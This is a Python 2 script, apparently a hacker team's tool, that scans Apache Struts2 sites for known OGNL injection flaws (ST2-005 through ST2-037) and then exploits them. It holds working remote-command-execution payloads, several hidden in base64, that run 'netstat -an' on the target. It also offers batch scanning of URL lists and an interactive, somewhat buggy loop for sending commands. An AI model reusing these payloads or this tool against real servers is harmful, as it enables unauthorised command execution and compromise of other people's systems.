#!/usr/bin/env python
# coding=utf-8
# code by 红色黑客团队
'''
使用方法: python struts-scan.py http://vuln.com/xxx.action/do
         python struts-scan.py -f xxx.txt (批量扫描，每行一个)
'''
import sys
import base64
import warnings
import requests
from termcolor import cprint

warnings.filterwarnings("ignore")
reload(sys)
sys.setdefaultencoding('utf-8')

headers = {
    "Accept":"application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
    "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50", 
    "Content-Type":"application/x-www-form-urlencoded"
}
headers2 = {
     
}

proxies = {'http': 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}

scan = "'netstat -an'"

class struts_baseverify:


    def __init__(self, url, cmd=scan):
    	self.status = []
        self.url = url
        self.poc = {
        		#"ST2-005":"('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43mycmd\75\'netstat -an\'')(d))&(h)(('\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)')(d))&(i)(('\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())')(d))&(j)(('\43myres\75new\40byte[51020]')(d))&(k)(('\43mydat.readFully(\43myres)')(d))&(l)(('\43mystr\75new\40java.lang.String(\43myres)')(d))&(m)(('\43myout\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\43myout.getWriter().println(\43mystr)')(d))",
                "ST2-005":base64.b64decode("KCdcNDNfbWVtYmVyQWNjZXNzLmFsbG93U3RhdGljTWV0aG9kQWNjZXNzJykoYSk9dHJ1ZSYoYikoKCdcNDNjb250ZXh0W1wneHdvcmsuTWV0aG9kQWNjZXNzb3IuZGVueU1ldGhvZEV4ZWN1dGlvblwnXVw3NWZhbHNlJykoYikpJignXDQzYycpKCgnXDQzX21lbWJlckFjY2Vzcy5leGNsdWRlUHJvcGVydGllc1w3NUBqYXZhLnV0aWwuQ29sbGVjdGlvbnNARU1QVFlfU0VUJykoYykpJihnKSgoJ1w0M215Y21kXDc1XCduZXRzdGF0IC1hblwnJykoZCkpJihoKSgoJ1w0M215cmV0XDc1QGphdmEubGFuZy5SdW50aW1lQGdldFJ1bnRpbWUoKS5leGVjKFw0M215Y21kKScpKGQpKSYoaSkoKCdcNDNteWRhdFw3NW5ld1w0MGphdmEuaW8uRGF0YUlucHV0U3RyZWFtKFw0M215cmV0LmdldElucHV0U3RyZWFtKCkpJykoZCkpJihqKSgoJ1w0M215cmVzXDc1bmV3XDQwYnl0ZVs1MTAyMF0nKShkKSkmKGspKCgnXDQzbXlkYXQucmVhZEZ1bGx5KFw0M215cmVzKScpKGQpKSYobCkoKCdcNDNteXN0clw3NW5ld1w0MGphdmEubGFuZy5TdHJpbmcoXDQzbXlyZXMpJykoZCkpJihtKSgoJ1w0M215b3V0XDc1QG9yZy5hcGFjaGUuc3RydXRzMi5TZXJ2bGV0QWN0aW9uQ29udGV4dEBnZXRSZXNwb25zZSgpJykoZCkpJihuKSgoJ1w0M215b3V0LmdldFdyaXRlcigpLnByaW50bG4oXDQzbXlzdHIpJykoZCkp"),
                "ST2-009":'''class.classLoader.jarPath=%28%23context["xwork.MethodAccessor.denyMethodExecution"]%3d+new+java.lang.Boolean%28false%29%2c+%23_memberAccess["allowStaticMethodAccess"]%3dtrue%2c+%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%27netstat -an%27%29.getInputStream%28%29%2c%23b%3dnew+java.io.InputStreamReader%28%23a%29%2c%23c%3dnew+java.io.BufferedReader%28%23b%29%2c%23d%3dnew+char[50000]%2c%23c.read%28%23d%29%2c%23sbtest%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23sbtest.println%28%23d%29%2c%23sbtest.close%28%29%29%28meh%29&z[%28class.classLoader.jarPath%29%28%27meh%27%29]''',
                "ST2-013":base64.b64decode("YT0xJHsoJTIzX21lbWJlckFjY2Vzc1siYWxsb3dTdGF0aWNNZXRob2RBY2Nlc3MiXT10cnVlLCUyM2E9QGphdmEubGFuZy5SdW50aW1lQGdldFJ1bnRpbWUoKS5leGVjKCduZXRzdGF0IC1hbicpLmdldElucHV0U3RyZWFtKCksJTIzYj1uZXcramF2YS5pby5JbnB1dFN0cmVhbVJlYWRlciglMjNhKSwlMjNjPW5ldytqYXZhLmlvLkJ1ZmZlcmVkUmVhZGVyKCUyM2IpLCUyM2Q9bmV3K2NoYXJbNTAwMDBdLCUyM2MucmVhZCglMjNkKSwlMjNzYnRlc3Q9QG9yZy5hcGFjaGUuc3RydXRzMi5TZXJ2bGV0QWN0aW9uQ29udGV4dEBnZXRSZXNwb25zZSgpLmdldFdyaXRlcigpLCUyM3NidGVzdC5wcmludGxuKCUyM2QpLCUyM3NidGVzdC5jbG9zZSgpKX0="),
                "ST2-016":'''redirect:${%23a%3d(new java.lang.ProcessBuilder('''+cmd+'''.toString().split('\\\\s'))).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}''',
                "ST2-019":base64.b64decode("ZGVidWc9Y29tbWFuZCZleHByZXNzaW9uPSNmPSNfbWVtYmVyQWNjZXNzLmdldENsYXNzKCkuZ2V0RGVjbGFyZWRGaWVsZCgnYWxsb3dTdGF0aWNNZXRob2RBY2Nlc3MnKSwjZi5zZXRBY2Nlc3NpYmxlKHRydWUpLCNmLnNldCgjX21lbWJlckFjY2Vzcyx0cnVlKSwjcmVxPUBvcmcuYXBhY2hlLnN0cnV0czIuU2VydmxldEFjdGlvbkNvbnRleHRAZ2V0UmVxdWVzdCgpLCNyZXNwPUBvcmcuYXBhY2hlLnN0cnV0czIuU2VydmxldEFjdGlvbkNvbnRleHRAZ2V0UmVzcG9uc2UoKS5nZXRXcml0ZXIoKSwjYT0obmV3IGphdmEubGFuZy5Qcm9jZXNzQnVpbGRlcihuZXcgamF2YS5sYW5nLlN0cmluZ1tdeyduZXRzdGF0JywnLWFuJ30pKS5zdGFydCgpLCNiPSNhLmdldElucHV0U3RyZWFtKCksI2M9bmV3IGphdmEuaW8uSW5wdXRTdHJlYW1SZWFkZXIoI2IpLCNkPW5ldyBqYXZhLmlvLkJ1ZmZlcmVkUmVhZGVyKCNjKSwjZT1uZXcgY2hhclsxMDAwMF0sI2QucmVhZCgjZSksI3Jlc3AucHJpbnRsbigjZSksI3Jlc3AuY2xvc2UoKQ=="),
                "ST2-devmode":'''?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=netstat%20-an''',
                "ST2-032":'''?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=netstat -an&pp=____A&ppp=%20&encoding=UTF-8''', 
                "ST2-037":'''/(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=16456&command=netstat -an'''
                }

    def exploit(self, vuln):

		print ('Explotando')
		req = requests.post(self.url, headers=headers, data=self.poc[vuln], timeout=6, verify=False)
		print req.text.strip()
	    


    def check(self, pocname, vulnstr):

        if vulnstr.find("Active Connections") is not -1 or vulnstr.find("活动连接") is not -1 or vulnstr.find("Active Internet connections") is not -1 \
        or vulnstr.find("Conexiones activas") is not -1 or vulnstr.find("LISTEN") is not -1:
            cprint("目标存在" + pocname + "漏洞..", "red")
            self.status.append(pocname)
        else:
            cprint("目标不存在" + pocname +"漏洞..", "green")
    

    def scan(self):

        cprint("-------检测struts2漏洞--------\n目标url:"+self.url, "cyan")

        for vulnerability in self.poc:
        	print vulnerability
	        try:
	            req = requests.post(self.url, headers=headers, data=self.poc[vulnerability], timeout=6, verify=False)
	            self.check(vulnerability, req.text)
	        except:
	            cprint("检测"+vulnerability+"超时..", "cyan")
   

if __name__ == "__main__":

    if sys.argv[1] == "-f":
        with open(sys.argv[2]) as f:
            for line in f.readlines():
                line = line.strip()
                strutsVuln = struts_baseverify(line)
                strutsVuln.scan()
    else:
        strutsVuln = struts_baseverify(sys.argv[1])
        strutsVuln.scan()
        print 'El sistema es vulnerable a:'
        print strutsVuln.status
        vuln = raw_input('Qué vulnerabilidad quieres explotar?\n')
        while True:
        	cmd = raw_input ('Inserte comando...\n')
        	strutsExploit = struts_baseverify(sys.argv[1], "'pwd'")	
        	strutsExploit.exploit(vuln)
        
